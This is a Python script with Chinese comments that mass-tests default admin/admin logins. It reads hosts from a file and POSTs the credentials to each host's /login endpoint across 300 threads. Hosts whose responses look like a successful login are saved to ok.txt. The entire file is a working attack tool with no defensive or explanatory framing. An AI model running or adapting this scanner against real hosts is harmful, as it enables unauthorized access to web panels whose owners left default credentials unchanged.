import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlsplit

def request_login(url):
    # 构造请求体
    url = f'http://{url}/login'
    data = {'username': 'admin', 'password': 'admin'}
    
    try:
        # 发送请求
        response = requests.post(url, data=data, verify=False, timeout=3)
        print(url + response.text)
        # 根据返回值写入对应文件
        if 'success":true' in response.text and 'obj":null' in response.text:
            domain = urlsplit(url).netloc
            with open('ok.txt', 'a') as ok_file:
                ok_file.write(domain + '\n')
        else:
            print(url + "failed"+'\n')
    except requests.exceptions.RequestException as e:
        print(f'{url}: {e}\n')

with open('url_all.txt', 'r') as f:
    urls = [line.strip() for line in f]

# 创建线程池
with ThreadPoolExecutor(max_workers=300) as executor:
    # 使用map方法提交任务
    results = executor.map(request_login, urls)

# results 是一个迭代器，不需要手动处理任务结果，当所有任务完成后，程序会继续执行下一步。
